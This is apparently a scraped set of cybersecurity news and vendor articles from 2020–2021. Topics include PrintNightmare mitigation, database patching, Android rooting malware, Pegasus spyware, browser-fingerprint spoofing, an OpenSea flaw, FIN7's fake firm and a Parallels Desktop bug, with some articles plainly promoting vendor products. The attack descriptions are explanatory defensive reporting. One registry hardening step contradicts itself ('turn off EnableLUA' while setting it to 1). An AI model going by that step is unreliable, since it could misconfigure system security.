organizations end up building the car while they are driving down the highway at 100 miles per hour. They are hit with an incident and no one has any idea what to do:\nThe Incident Response Plan hasn\u2019t been updated in three years.\nNo one\u2019s phone number is accurate.\nCybersecurity insurance was never set up.\nReporting requirements are not defined.\nThe possibilities of how things can go wrong are truly endless.\nTriaging a cybersecurity incident is an incredibly stressful experience. Alleviate some of that stress and save money by testing your Incident Response Plan via Tabletop Exercises or interactive scenario-driven sessions, at least two times a year. Make sure to include a \u201cLessons Learned\u201d hot wash after any testing exercises to identify what Incident Response methods worked well, and what could use some work. Finally, take action and ensure proposed enhancements or changes to current Incident Response processes are updated within the Incident Response Plan and associated policies.\nKnow Your Weaknesses\nYou can\u2019t protect yourself against the threats that you do not know you are susceptible to. Execute an annual cybersecurity risk assessment across your organization, accounting for people, process and technology. Consider leveraging an external vendor that specializes in conducting in-depth cyber risk assessments against a respected industry framework, such as the National Institute of Standards and Technology (NIST) and Cybersecurity Framework (CSF). Identified risks should be associated with an in-depth recommendation that can be implemented to either fully remediate or mitigate the associated risk. In most cases, findings and recommendations are accommodated by a priority designation or strategic implementation roadmap\u2014these are invaluable tools you can use to determine how to make the most impactful mark on your current security posture.\nDon\u2019t Get Caught Without Viable Backups\nAs mentioned earlier in this report, ransomware was the number one compromise method of 2019. Without viable backups, you are quite literally putting the livelihood of your business into the hands of cyber criminals. According to Unit 42\u2019s 2020 Incident Response & Data Breach Report, an increasing number of incidents have included the deletion or disablement of backups. Regularly create and test backups. Be intimately familiar with the backup restoration process. And most importantly, ensure that backups are stored off-network and are protected by appropriate security measures, so threat actors cannot gain access and disable or delete backups to prevent recovery.\nBring in the Experts\nYou don\u2019t have to do it all alone. Engaging a cybersecurity consultant or external partner is a great way to introduce security-specific expertise into your organization. Cybersecurity consultants are often privy to best practices and industry trends of the moment, so they will be able to offer new insights regarding what is currently working in the field. Forming relationships with outside experts will equip you with a strong network to tap into whether you are looking to bolster your organization\u2019s security solutions or just gain an outside perspective regarding industry best practices.\nFinal Thoughts\nBreaches are expensive, and likely more expensive than you thought they would be. While the up-front costs of proactively investing in cybersecurity capabilities may seem expensive, they are likely to save organizations significant amounts of money in the long run. Strategic proactive cybersecurity investments are imperative for organizations that wish to flourish in today\u2019s complex and dangerous cyber landscape.\nTo get help preventing and combating cyber incidents, contact the Unit 42 Incident Response team.\nRead the first part of this series, The True Cost of Cybersecurity Incidents: The Problem.\nResources\nCost of a Data Breach Report 2020\n2020 Unit 42 Incident Response & Data Breach Report\nBest Practices to Backing Up Data\nKey Considerations When Building a Formal Incident Response Plan\n ",

With this shift and rise in adoption of cloud services and cloud native architectures also comes risks and business challenges.\nSecurity teams need to ensure that cloud environments are configured properly as any misconfiguration could leak data or provide a target for attackers. These teams also need to work with compliance and audit teams to achieve and maintain compliance, which is a challenge in highly dynamic cloud environments. Additionally, cloud environments and cloud native applications need to be protected, both at runtime and across the application lifecycle to address vulnerabilities and misconfigurations.\nMeasuring the ROI of Prisma Cloud, Our Cloud Native Security Platform\nPalo Alto Networks commissioned Forrester Consulting to conduct a Total Economic Impact\u2122 (TEI) study and examine the potential return on investment (ROI) enterprises may realize by deploying Prisma Cloud. Forrester interviewed five customers with experience using Prisma Cloud to understand the benefits and value of their investment and use of our Cloud-Native Security Platform.\nThese customers shared that prior solutions \u201cyielded limited success, leaving customers with little to no cloud security posture visibility, siloed developer and security processes and teams, and poor compliance and reporting.\u201d With Prisma Cloud, the Forrester TEI study showed customers were able to dramatically change how they secured their cloud environments and cloud native applications.\nSee the Results With Prisma Cloud\n276% ROI Over Three Years\nBy deploying Prisma Cloud, organizations were able to improve security outcomes, improve the ability to fix vulnerabilities and reduce time spent on managing compliance while lowering the likelihood of material data breaches.

        "author": "The Hacker News",
        "date": "July 08, 2021",
        "text": "\n This week,  PrintNightmare  - Microsoft's Print Spooler vulnerability (CVE-2021-34527) was upgraded from a 'Low' criticality to a 'Critical' criticality. \n This is due to a Proof of Concept published on GitHub, which attackers could potentially leverage for gaining access to Domain Controllers. \n As we  reported earlier , Microsoft already released a patch in June 2021, but it wasn't enough to stop exploits. Attackers can still use Print Spooler when connecting remotely. You can find all you need to know about this vulnerability in this article and how you can mitigate it (and you can).  \n Print Spooler in a nutshell:  Print Spooler is Microsoft's service for managing and monitoring files printing. This service is among Microsoft's oldest and has had minimal maintenance updates since it was released.  \n Every Microsoft machine (servers and endpoints) has this feature enabled by default. \n PrintNightmare vulnerability:  As soon as an attacker gains limited user access to a network, he will be able to connect (directly or remotely) to the Print Spooler. Since the Print Spooler has direct access to the kernel, the attacker can use it to gain access to the operating system, run remote code with system privileges, and ultimately attack the Domain Controller. \n Your best option when it comes to mitigating the PrintNightmare vulnerability is to disable the Print Spooler on every server and/or sensitive workstation (such as administrators' workstations, direct internet-facing workstations, and non-printing workstations). \n This is what Dvir Goren's, hardening expert and CTO at  CalCom Software Solutions , suggests as your first move towards mitigation. \n Follow these steps to disable the Print Spooler service on Windows 10: \n \n Open Start. \n Search for PowerShell, right-click on it and select the Run as administrator. \n Type the command and press Enter:  Stop-Service -Name Spooler -Force \n Use this command to prevent the service from starting back up again during restart: Set-Service -Name Spooler -StartupType Disabled \n \n According to Dvir's experience, 90% of servers do not require Print Spooler. It is the default configuration for most of them, so it is usually enabled. As a result, disabling it can solve 90% of your problem and have little impact on production. \n In large and complex infrastructures, it can be challenging to locate where Print Spooler is used. \n Here are a few examples where Print Spooler is required: \n \n When using Citrix services, \n Fax servers, \n Any application requiring virtual or physical printing of PDFs, XPSs, etc. Billing services and wage applications, for example. \n \n Here are a few examples when Print Spooler is not needed but enabled by default: \n \n Domain Controller and Active Directory \u2013 the main risk in this vulnerability can be neutralized by practicing basic cyber hygiene. It makes no sense to have Print Spooler enabled in DCs and AD servers.  \n Member servers such as SQL, File System, and Exchange servers.  \n Machines that do not require printing.  \n \n A few other hardening steps suggested by Dvir for machines dependent on Print Spooler include: \n \n Replace the vulnerable Print Spooler protocol with a non-Microsoft service.  \n By changing 'Allow Print Spooler to accept client connections', you can restrict users' and drivers' access to the Print Spooler to groups that must use it. \n Disable Print Spooler caller in Pre-Windows 2000 compatibility group. \n Make sure that Point and Print is not configured to No Warning \u2013 check registry key SOFTWARE/Policies/Microsoft/Windows NT/Printers/PointAndPrint/NoElevationOnInstall for DWORD value 1 and change it to 0. \n Turn off EnableLUA \u2013 check registry key SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System/EnableLUA for DWORD value 0 and change it to 1. \n \n Here's what you need to do next to ensure your organization is secure: \n \n Identify where Print Spooler is being used on your network.  \n Map your network to find the machines that must use Print Spooler. \n Disable Print Spooler on machines that do not use it.  \n For machines that require Print Spooler \u2013 configure them in a way to minimize its attack surface.  \n \n Beside this, to find potential evidence of exploitation, you should also monitor Microsoft-Windows-PrintService/Admin log entries. There might be entries with error messages that indicate Print Spooler can't load plug-in module DLLs, although this can also happen if an attacker packaged a legitimate DLL that Print Spooler demands. \n The final recommendation from Dvir is to implement these recommendations through  hardening automation tools . Without automation, you will spend countless hours attempting to harden manually and may end up vulnerable or causing systems to go down \n After choosing your course of action, a  Hardening automation tool  will discover where Print Spooler is enabled, where they are actually used, and disable or reconfigure them automatically. \n \n \n \n Found this article interesting?

        "title": "Why Database Patching Best Practice Just Doesn't Work and How to Fix It",
        "author": "The Hacker News",
        "date": "October 18, 2021",
        "text": "\n Patching really, really matters \u2013 patching is what keeps technology solutions from becoming like big blocks of Swiss cheese, with endless security vulnerabilities punching hole after hole into critical solutions. \n But anyone who's spent any amount of time maintaining systems will know that patching is often easier said than done. \n Yes, in some instances, you can just run a command line to install that patch, and that's it. These instances are increasingly rare though \u2013 given the complexity of the technology environment, you're more likely faced with a complex process to achieve patching best practice. \n In this article, we'll outline why database patching matters (yes, databases are vulnerable too!), explain what the problem is with patching databases, and point to a novel solution that takes the pain out of database patching. \n Watch out \u2013 your database services are vulnerable too \n We know that database services are critical \u2013 databases underpin IT operations in countless ways, working away in the background. Yet databases just aren't the most interesting parts of the technology stack, which is one of the reasons database patching can get neglected.  In a recent survey by Imperva , the company found that nearly 50% of on-premise databases were vulnerable to a known exploit. \n Cybercriminals, however, are not ignoring databases. Just like any other element of the technology stack, databases are full of vulnerabilities. Just one database service alone  has over a thousand related vulnerabilities . \n Consider a few examples. In September 2016,  CVE-2016-6662  was reported, a vulnerability that allows attackers to inject malicious MySQL configuration settings into a victim's database service. It affected MySQL clones too \u2013 including MariaDB, which was forced to  publish detailed mitigating steps here . \n Another example:  in 2020, a database vulnerability was identified where  attackers could mount a privilege escalation attack because of how certain versions of MariaDB handled \"setuid\" at the installation stage. \n In both our examples, patching \u2013 or upgrading to a newer version of the database service \u2013 would close the vulnerability. But herein lies the problem: patching doesn't happen as consistently as it should, and not just because tech teams are lazy \u2013 or because database services are forgotten about. \n Just get on patch management, right\u2026? \n Not quite. There's a second reason why database patching gets neglected \u2013 patching a database can be incredibly hard, with conflicting and ambiguous instructions. This problem is particularly prevalent where database implementations are quite complex. \n Take MySQL clusters, for example. The open-source database MySQL has an  official article outlining how users need to patch a MySQL cluster  \u2013 but the instructions are intricate, and it only considers one particular setup of MySQL cluster, InnoDB, when there are other MySQL cluster strategies. \n The above MySQL instructions also leave out a few important aspects of patching. It doesn't cover how the patching process may affect other applications \u2013 or how it may affect other systems in your technology solution. It can't offer this advice, of course, because every environment is different, and the writers don't know what your environment looks like. \n And therein lies a major issue with patching best practice, and database best practice in general: it's almost impossible to account for the infinite practical variations \u2013 from differences in database configuration to different levels of technical knowledge. \n Patching best practice just fit for purpose \n The net result can be that implementing published patching best practice is a very ambiguous and uncertain exercise. Sysadmins can easily decide the risks and implications of patching going wrong is much more significant than the risk of a cyberattack on the database. So, while in theory, it's easy to just \"get on with patching\", the reality is very different. \n Even where teams have the technical knowledge and the practical certainty to make a success of database patching, there is still the reality that a database service must go offline for some time to perform the patching. \n Without high availability, downtime is the most disruptive side effect as tech services go offline, disrupting work.  \n High availability configurations  can ensure that there's no downtime, but even these are likely to experience service degradation as some servers in a cluster are offline and unable to support demand or provide adequate protection while some nodes are down for maintenance. \n Complex patching procedures also consume a significant amount of time which takes resources away from other important tasks \u2013 and in some cases, the resources might simply not be there to ensure consistent patching. \n Finally, taking databases offline for patching and managing complex migration processes always carries a risk of something going wrong. Data corruption could creep in during migration, or some servers may fail to come back to life after patching. These risks can't be ignored \u2013 and are intrinsic to current database patching practices that require restarts. \n Live database patching as an alternative \n Until recently patching a technology service almost always required a restart, but live patching is becoming increasingly prevalent. With live patching, the patching tools perform an in-place swap of the patched code: the service being patched keeps running while patching takes place, with no restart required. \n That's exactly the role of  DatabaseCare , the new solution from TuxCare. Thanks to DatabaseCare, you can perform comprehensive patching as often as you like because DatabaseCare patches your database while it is actively running and serving data. \n How does this work? It's simple in practice. Your server connects to the on-premises DatabaseCare ePortal where patches are securely stored. As soon as a new vulnerability is logged, an agent communicates with the ePortal, which then pulls the update from DatabaseCare. The agent then momentarily freezes your database service in a safe mode, and transparently applies the patch in memory. This \"freeze\" is so fast that it doesn't even disrupt network connections to the database service or running queries. \n The result: your databases are automatically updated with the latest security patches, without downtime, with minimal disruption and risk \u2013 and with zero ongoing effort from your technical teams. \n How does DatabaseCare benefit you? \n Let's take a clearer look at the benefits of live patching \u2013 compared to patching best practice as it stands. \n We've already pointed to the complexity of database patching, particularly for high availability, distributed databases. DatabaseCare replaces a complex set of steps involving tricky migration procedures with a single, one-time, simple step \u2013 that's easily automated too. \n It removes the ambiguity from patching your databases. Are you following the right instructions? Will it work, even if you do it perfectly? All those questions are now gone \u2013 patching happens automatically and in the background. And so yes, the risk involved in patching databases is now significantly mitigated, which reduces the hesitation to patch. \n At the same time, automated patching also means that you don't need to try and fit patching in amongst another long list of draining IT tasks. And, when patching doesn't compete for resources, it happens more regularly. Other business units inside the organization will appreciate how you no longer require long maintenance windows for your patching operations. \n We all know what regular patching means: tighter security. Reduce the window between the release date of a patch, and when that patch is applied, and you reduce the window of opportunity for attackers to exploit a vulnerability. \n Best practice matters \u2013 but DatabaseCare unlocks consistent security \n Patching database services isn't new \u2013 best practice instructions have been around for some time. But there are practical difficulties to patching best practices as it stands, and these practical difficulties leave a window for cyber attackers. \n DatabaseCare plugs the gap \u2013 it doesn't disrupt your operations, it doesn't pose a risk of failure, and you don't need resources to make it work. In turn, your security becomes much more solid. Installing DatabaseCare is simple too. To find out more, just review the  DatabaseCare page  on the TuxCare website. \n \n \n \n Found this article interesting?

By using the rooting process to gain privileged access to the Android operating system, the threat actor can silently grant themselves dangerous permissions or install additional malware \u2014 steps that would normally require user interaction,\" Lookout researchers said. \"Elevated privileges also give the malware access to other apps' sensitive data, something not possible under normal circumstances.\" \n Once installed, the attack chain is designed to leverage one of five exploits for older Android security flaws that would allow it to gain root permissions and take over the device, extract sensitive data, and transmit to a remote attack-controlled server \u2014 \n \n CVE-2015-3636  (PongPongRoot) \n CVE-2015-1805  (iovyroot) \n CVE-2019-2215  (Qu1ckr00t) \n CVE-2020-0041 , and \n CVE-2020-0069 \n \n \n Lookout attributed the mass distributed rooting malware campaign to a \"well-resourced group with financial motivation,\" with telemetry data revealing that Android device users in the U.S. were the most impacted. The ultimate objective of the infiltrations remains unclear as yet. \n \"Rooting Android or jailbreaking iOS devices are still the most invasive ways to fully compromise a mobile device,\" the researchers said, adding \"mobile devices are perfect tools for cyber criminals to exploit, as they have countless functionalities and hold an immense amount of sensitive data.\" \n \n \n \n Found this article interesting?

        "text": "\n The iPhone of New York Times journalist Ben Hubbard was repeatedly hacked with NSO Group's Pegasus spyware tool over a three-year period stretching between June 2018 to June 2021, resulting in infections twice in July 2020 and June 2021. \n The University of Toronto's Citizen Lab, which  publicized  the findings on Sunday, said the \"targeting took place while he was reporting on Saudi Arabia, and writing a book about Saudi Crown Prince Mohammed bin Salman.\" The research institute did not attribute the infiltrations to a specific government. \n In a  statement  shared with Hubbard, the Israeli company denied its involvement in the hacks and dismissed the findings as \"speculation,\" while noting that the journalist was not \"a target of Pegasus by any of NSO's customers.\" \n \n To date, NSO Group is believed to have leveraged at least three different iOS exploits \u2014 namely an iMessage zero-click exploit in December 2019, a  KISMET  exploit targeting iOS 13.5.1 and iOS 13.7 starting July 2020, and a  FORCEDENTRY  exploit aimed at iOS 14.x until 14.7.1 since February 2021. \n It's worth pointing out that Apple's iOS 14 update includes a  BlastDoor Framework  that's designed to make zero-click exploitation more difficult, although FORCEDENTRY expressly undermines that very security feature built into the operating system, prompting Apple to  issue an update  to remediate the shortcoming in September 2021. \n FORCEDENTRY exploit on the phone of the Saudi activist \n Forensic investigation into the campaign has revealed that Hubbard's iPhone was successfully hacked with the surveillance software twice on July 12, 2020 and June 13, 2021, once each via the KISMET and FORCEDENTRY zero-click iMessage exploits, after making two earlier unsuccessful attempts via SMS and WhatsApp in 2018. \n The disclosure is the latest in a long list of documented cases of activists, journalists, and heads of state being targeted or hacked using the company's \"military-grade spyware.\" Earlier revelations in July laid bare an  extensive abuse  of the tool by several authoritarian governments to facilitate human rights violations around the world. \n \n The findings are also particularly significant in light of a new interim rule passed by the U.S. government that  requires  that companies dabbling in intrusion software acquire a license from the Commerce Department before exporting such \"cybersecurity items\" to countries of \"national security or weapons of mass destruction concern.\" \n \"As long as we store our lives on devices that have vulnerabilities, and surveillance companies can earn millions of dollars selling ways to exploit them, our defenses are limited, especially if a government decides it wants our data,\" Hubbard  wrote  in the New York Times. \n \"Now, I limit the information I keep on my phone. I reboot my phone often, which can kick out (but not keep off) some spy programs. And, when possible, I resort to one of the few non-hackable options we still have: I leave my phone behind and meet people face to face,\" Hubbard added. \n \n \n \n Found this article interesting?

        "text": "\n A \"potentially devastating and hard-to-detect threat\" could be abused by attackers to collect users' browser fingerprinting information with the goal of spoofing the victims without their knowledge, thus effectively compromising their privacy. \n Academics from Texas A&M University dubbed the attack system \" Gummy Browsers ,\" likening it to a nearly 20-year-old \" Gummy Fingers \" technique that can impersonate a user's fingerprint biometrics.  \n \n \"The idea is that the attacker \ud835\udc34 first makes the user \ud835\udc48 connect to his website (or to a well-known site the attacker controls) and transparently collects the information from \ud835\udc48 that is used for fingerprinting purposes (just like any fingerprinting website \ud835\udc4a collects this information),\" the researchers outlined. \"Then, \ud835\udc34 orchestrates a browser on his own machine to replicate and transmit the same fingerprinting information when connecting to \ud835\udc4a, fooling \ud835\udc4a to think that \ud835\udc48 is the one requesting the service rather than \ud835\udc34.\" \n Browser fingerprinting, also called machine fingerprinting, refers to a  tracking technique  that's used to  uniquely identify internet users  by gathering attributes about the software and hardware of a remote computing system \u2014 such as the choice of browser, timezone, default language, screen resolution, add-ons, installed fonts, and even preferences \u2014 as well as behavioral characteristics that emerge when interacting with the web browser of the device. \n Thus in the event the website populates targeted ads based on only the users' browser fingerprints, it could result in a scenario where the remote adversary can profile any target of interest by manipulating their own fingerprints to match that of the victim for extended periods of time, all the while the user and the website remain oblivious to the attack. \n Put differently, by exploiting the fact that the server treats the attacker's browser as the victim's browser, not only would the former receive same or similar ads like that of the impersonated victim, it also allows the malicious actor to infer sensitive information about the user (e.g., gender, age group, health condition, interests, salary level, etc.) and build a personal behavioral profile. \n \n In experimental tests, the researchers found that the attack system achieved average false-positive rates of greater than 0.95, indicating that most of the spoofed fingerprints were misrecognized as legitimate ones, thereby successfully tricking the digital fingerprinting algorithms. A consequence of such an attack is a breach of ad privacy and a bypass of defensive mechanisms put in place to authenticate users and detect fraud. \n \"The impact of Gummy Browsers can be devastating and lasting on the online security and privacy of the users, especially given that browser-fingerprinting is starting to get widely adopted in the real world,\" the researchers concluded. \"In light of this attack, our work raises the question of whether browser fingerprinting is safe to deploy on a large scale.\" \n \n \n \n Found this article interesting?

        "text": "\n A now-patched critical vulnerability in OpenSea, the world's largest non-fungible token ( NFT ) marketplace, could've been abused by malicious actors to drain cryptocurrency funds from a victim by sending a specially-crafted token, opening a new attack vector for exploitation. \n The findings come from cybersecurity firm Check Point Research, which began an investigation into the platform following public reports of stolen cryptocurrency wallets triggered by free airdropped NFTs. The issues were fixed in less than one hour of responsible disclosure on September 26, 2021. \n \n \"Left unpatched, the vulnerabilities could allow hackers to hijack user accounts and steal entire cryptocurrency wallets by crafting malicious NFTs,\" Check Point researchers  said . \n As the name indicates, NFTs are unique digital assets such as photos, videos, audio, and other items that can be sold and traded on the blockchain, using the technology as a certificate of authenticity to establish a verified and public proof of ownership. \n \n The modus operandi of the attack relies on sending victims a malicious NFT that, when clicked, results in a scenario whereby rogue transactions can be facilitated through a third-party wallet provider simply by providing a wallet signature to connect their wallets and perform actions on the targets' behalf. \"Users should be hyper-aware of what they sign on OpenSea, as well as other NFT platforms, and whether it correlates with expected actions,\" the researchers said. \n \n OpenSea said it hasn't identified any instances where this vulnerability was exploited in the wild but added it's working with third-party wallet services to \"help users better identify malicious signature requests, as well as other initiatives to help users thwart scams and phishing attacks with greater efficacy.\" \n \"Blockchain innovation is fast-underway and NFTs are here to stay. Given the sheer pace of innovation, there is an inherent challenge in securely integrating software applications and crypto markets,\" said Oded Vanunu, head of products vulnerabilities research at Check Point. \"Bad actors know they have an open window right now to take advantage of, with consumer adoption spiking, while security measures in this space still need to catch up.\" \n \n \n \n Found this article interesting?

        "text": "\n The financially motivated FIN7 cybercrime gang has masqueraded as yet another fictitious cybersecurity company called \"Bastion Secure\" to recruit unwitting software engineers under the guise of penetration testing in a likely lead-up to a ransomware scheme. \n \"With FIN7's latest fake company, the criminal group leveraged true, publicly available information from various legitimate cybersecurity companies to create a thin veil of legitimacy around Bastion Secure,\" Recorded Future's Gemini Advisory unit  said  in a report. \"FIN7 is adopting disinformation tactics so that if a potential hire or interested party were to fact check Bastion Secure, then a cursory search on Google would return 'true' information for companies with a similar name or industry to FIN7's Bastion Secure.\" \n \n FIN7 , also known as Carbanak, Carbon Spider, and Anunak, has a  track record  of striking restaurant, gambling, and hospitality industries in the U.S. to infect point-of-sale (POS) systems with malware designed to harvest credit and debit card numbers that are then used or sold for profit on underground marketplaces. The latest development shows the group's expansion into the highly profitable ransomware landscape. \n Setting up fake front companies is a tried-and-tested formula for FIN7, which has been previously linked to another sham cybersecurity firm dubbed  Combi Security  that claimed to offer penetration testing services to customers. Viewed in that light, Bastion Secure is a continuation of that tactic. \n \n Not only does the new website feature stolen content compiled from other legitimate cybersecurity firms \u2014 primarily Convergent Network Solutions \u2014 the operators advertised seemingly genuine hiring opportunities for C++, PHP, and Python programmers, system administrators, and reverse-engineers on popular job boards, offering them several tools for practice assignments during the interview process. \n These tools were analyzed and found to be components of the post-exploitation toolkits  Carbanak  and  Lizar /Tirion, both of which have been previously attributed to the group and can be leveraged to compromise POS systems and deploy ransomware. \n \n It's, however, in the next stage of the hiring process that Bastion Secure's involvement in criminal activity became evident, what with the company's representatives providing access to a so-called client company's network and asking prospective candidates to gather information on domain administrators, file systems, and backups, signalling a strong inclination towards conducting ransomware attacks. \n \"Bastion Secure's job offers for IT specialist positions ranged between $800 and $1,200 USD a month, which is a viable starting salary for this type of position in post-Soviet states,\" the researchers said. \"However, this 'salary' would be a small fraction of a cybercriminal's portion of the criminal profits from a successful ransomware extortion or large-scale payment card-stealing operation.\" \n \n By paying \"unwitting 'employees' far less than it would have to pay informed criminal accomplices for its ransomware schemes, [\u2026] FIN7's fake company scheme enables the operators of FIN7 to obtain the talent that the group needs to carry out its criminal activities, while simultaneously retaining a larger share of the profits,\" the researchers added. \n Besides posing as a corporate entity, an additional step taken by the actor to give it a ring of authenticity is the fact that one of the company's office addresses is the same as that of a now-defunct, U.K.-based company named  Bastion Security (North) Limited . Web browsers such as Apple Safari and Google Chrome have since blocked access to the deceptive site. \n \"Although cybercriminals looking for unwitting accomplices on legitimate job sites is nothing new, the sheer scale and blatancy with which FIN7 operates continue to surpass the behavior shown by other cybercriminal groups,\" the researchers said, adding the group is \"attempting to obfuscate its true identity as a prolific cybercriminal and ransomware group by creating a fabricated web presence through a largely legitimate-appearing website, professional job postings, and company info pages on Russian-language business development sites.\" \n \n \n \n Found this article interesting?

        "author": "The Hacker News",
        "date": "October 27, 2021",
        "text": "\n One of the side effects of today\u2019s cyber security landscape is the overwhelming volume of data security teams must aggregate and parse. Lean security teams don\u2019t have it any easier, and the problem is compounded if they must do it manually. Data and log management are essential for organizations to gain real-time transparency and visibility into security events.  \n XDR provider Cynet has offered up a new guide ( read it here ) that helps lean organizations understand the importance of centralized log management (CLM). The truth is that even the most well-stocked and staffed teams would have trouble manually handling their log management needs, which is why organizations are increasingly going the automated route.  \n On top of the efficiency of automation, CLM gives organizations much greater visibility into their environment and security events that impact them. However, the benefits of deploying CLM tools and reducing the level of human intervention in log management and analysis are much more than just reducing work hours.  \n Why CLM is critical for lean security teams \n Logs are a natural part of IT management. Each time-stamped event record collected in a log is an important piece of the overall puzzle that is an organization\u2019s security operation. This data can be a trail of breadcrumbs and indicators of compromise, which shows security teams what attackers are doing and attempting to do. However, when these logs are incomplete, improperly sorted, or simply not parsed, the picture becomes murkier and harder to glean.  \n CLM tools can help combat this lack of transparency in several ways. First, when there are more data points and logs that can be easily accessed and analyzed, organizations can build significantly better reconstructions of security incidents, different attack attempts, and breaches. Additionally, it helps for the future, as organizations can become better at detecting false positives and negatives, as well as missed detections. Finally, it reduces fatigue and wasted time, letting security teams focus on other key areas.  \n The new guide focuses on these topics, breaking down: \n \n The importance of accessing and analyzing log data . As mentioned above, simply having easy access to this data makes organizations better at detecting attacks and understanding previous incidents. More importantly, how data is stored also makes a difference, with data lakes a clear favorite. \n The four main approaches used to gain centralized log management.  Organizations can take a few different paths to improving their log management capabilities, and each comes with its own benefits and drawbacks. Understanding which path to take can help organizations make smarter decisions.  \n Why CLM is critical for security teams\u2019 success. L og management is all about adding greater transparency into an organization\u2019s security events, and handling it manually means organizations might lose out on a lot of key insights. CLM ensures this is not the case.  \n The key benefits of a CLM solution.  Building a CLM system from scratch is complex and not always feasible. Moreover, adding expensive tools that include advanced services and features just for CLM functionality isn\u2019t worth it. A CLM solution is an excellent middle ground. CLM also assists with meeting regulatory compliance requirements, automating reports, and managing policy changes.  \n \n Learn more about  how lean security teams can benefit from CLM here .  \n \n \n \n Found this article interesting?

        "text": "Firm offers guidance on how to mitigate a five-months-old privilege escalation bug impacting Parallels Desktop 16 for Mac and all previous versions.\nThe makers of Parallels Desktop has released a workaround fix for a high-severity privilege escalation bug that impacts its Parallels Desktop 16 for Mac software and all older versions. Mitigation advice comes five months after researchers first identified the bug in April.\nParallels Desktop, now owned by private equity giant KKR, is used by seven million users, according to the company, and allows Mac users to run Windows, Linux and other operating systems on their macOS.\nThe vulnerability allows malicious software running in a Parallels virtual machine (VM) to access macOS files shared in a default configuration of the software. The software maker stated that the recommended fixes need to be manually performed by end users and will likely \u201cinconvenience\u201d some while also reducing product functionality.\nIn a Wednesday security bulletin, first to widely disclose details of the bug, it was revealed that the vulnerability (CVE-2021-34864) is caused by improper access control in the Parallels\u2019 WinAppHelper component. The flaw, according to Parallels, is specifically tied to the software\u2019s Parallels Tools, a proxy for communications between the host macOS and the virtual machine\u2019s operating system.\nAn Easy-to-Exploit Bug\n\u201cThe issue results from the lack of proper access control. An attacker can leverage this vulnerability to escalate privileges and execute arbitrary code in the context of the hypervisor,\u201d according to a separate security advisory, also posted Wednesday.\nThe severity of the vulnerability is rated as high (8.8) using the Common Vulnerability Scoring System, version 3.0. The bulletin also warns that the level of complexity needed to exploit the vulnerability is \u201clow.\u201d\n\u201cBy default, Parallels Desktop shares files and folders between the Mac and a VM, so users can easily open macOS files from applications running in a virtual machine and save documents to Mac,\u201d Parallels explained. \u201cThis functionality exposes the user home folder to the VM. This folder may contain configuration files, cache from different applications, etc., that malicious software can access.\u201d\nParallels is advising users to mitigate the vulnerability via reconfiguring their software or upgrading to the latest version, which is Parallels Desktop 17 for Mac, released on August 10.\n\u201cParallels Desktop 17 for Mac and newer versions are not affected. The entire home folder is no longer shared with a VM by default, only selected folders, like Desktop, Documents, Downloads, etc.,\u201d according to the vulnerability\u2019s summary description.\nThe company added, \u201cThis vulnerability allows local malicious users to escalate privileges on affected installations of Parallels Desktop. An attacker must first obtain the ability to execute low-privileged code on the target guest system in order to exploit this vulnerability.\u201d\nDisclosure Timeline \nThe flaw was initially detected by security researchers Sunjoo Park and Jack Dates on April 8, during Trend Micro\u2019s Pawn2Own Austin event. For their efforts, the researchers earned $40,000 each, according to the event\u2019s organizer.\nOn August 10, Parallels posted to its Knowledge Base information regarding the flaw, under the title \u201cMitigate ZDI-CAN-13543 in Parallels Desktop 16 and older\u201d. The post described the April discovery and mitigation steps users needed to take to protect themselves. On Wednesday, a number of security alerts posted the vulnerability\u2019s identifying number (CVE-2021-34864), assigning it a high-severity rating.\nThe prospect of malicious software or a threat actor breaking or escaping a virtual instance of Windows to infect a system is a worst-case scenario. Parallels did not return requests for comment for this report.\nParallels: An Inconvenient Fix\nTo mitigate against the vulnerability, Parallels Desktop 16 for Mac users (and other legacy users) have a number of options. The first option is to upgrade to Parallels Desktop 17 for Mac, which does not contain the flaw. It\u2019s unclear if affected customers will have to pay the $50 one-time upgrade fee for the Standard Edition to mitigate the flaw via an upgrade.\nFor customers running Parallels Desktop 16 users or earlier versions of the software, the company said the fixes available to them will \u201creduce functionality\u201d of the software and cause \u201cinconveniences,\u201d such as file duplications when sharing documents across VM and the host macOS.\n\u201cIf you don\u2019t plan to run untrusted code in the VM, it is recommended to follow common security practices,\u201d the company recommended. \u201cIf you run untrusted code in the VM and you want to isolate the VM from Mac, then one of the following options can be used.\u201d\nThose options, according Parallels, include:\nDisable shared folders as described in KB 6912. Shared Profile functionality will be disabled as well, and you will no longer be able to open Mac files in the VM or save files to Mac. Learn more in KB 6912.\nAlternatively, isolate the VM from Mac as described in KB 112942. After isolating, folders, files, applications, and external drives are not shared between two operating systems. In general, it becomes impossible for a VM to access any information on your Mac. Isolating a virtual machine provides the highest level of security.\nWhile the above mitigates security issue, it also eliminates one of Parallels selling points: \u201cSeamlessly move and share content between Mac and Windows.\u201d\nIt\u2019s also unclear whether macOS users who configure their systems to isolate the VM guest from the host operating system mitigate the flaw.\nResearchers Turn to Parallels  \nWhile Parallels Desktop for Mac is not marketed as a cybersecurity research tool, a number of websites recommend this type of use scenario.\nParallels is just one of many virtual machine options for macOS users to run alternate operating systems. Others include Apple\u2019s own Boot Camp feature, VirtualBox and VMWare for macOS.\nIncreased interest in Parallels has recently been sparked because in Apple\u2019s new ARM-based Macs, which contain its security-forward M1 chip, Boot Camp has been removed. Installing Windows 10 on M1 Macs requires an ARM copy of Microsoft\u2019s operating system.\nCraig Federighi, Apple\u2019s senior vice president of software engineering, said Apple is not planning to support Boot Camp on ARM-based Macs in the future, during a Daring Fireball podcast.\nSeeing an opportunity, on April 14 Parallels released an update for Parallels Desktop 16 for Mac that supports Mac computers with Apple M1 chip.\nCheck out our free upcoming live webinar events \u2013 unique, dynamic discussions with cybersecurity experts and the Threatpost community:\nWrite a comment\nShare this article:\nCloud Security\nMalware\nVulnerabilities",

        "title": "War-Driving Technique Allows Wi-Fi Password-Cracking at Scale",
        "author": "Tara Seals",
        "date": "October 27, 2021 1:00 pm",
